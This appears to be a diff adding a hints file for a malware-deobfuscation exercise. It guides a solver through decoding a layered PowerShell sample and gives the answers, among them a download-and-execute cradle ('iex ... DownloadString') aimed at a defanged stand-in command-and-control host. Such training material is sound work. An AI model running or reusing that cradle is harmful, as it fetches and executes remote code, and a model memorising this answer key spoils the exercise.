@@ -1,0 +1,7 @@
+{
+  "hints": [
+    "Run pwsh -NoProfile -NonInteractive -File peel.ps1 and read BOTH printed lines, not just the last one.",
+    "Layer 1 is the base64 blob decoded. It still looks backwards because it is -- read gnirtSdaolnwoD right-to-left and you have the name of the second layer.",
+    "Write plaintext.txt with the layer-2 line:\niex (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/p5')\nand layers.txt with:\nbase64 (UTF-16LE)\nstring reversal"
+  ]
+}
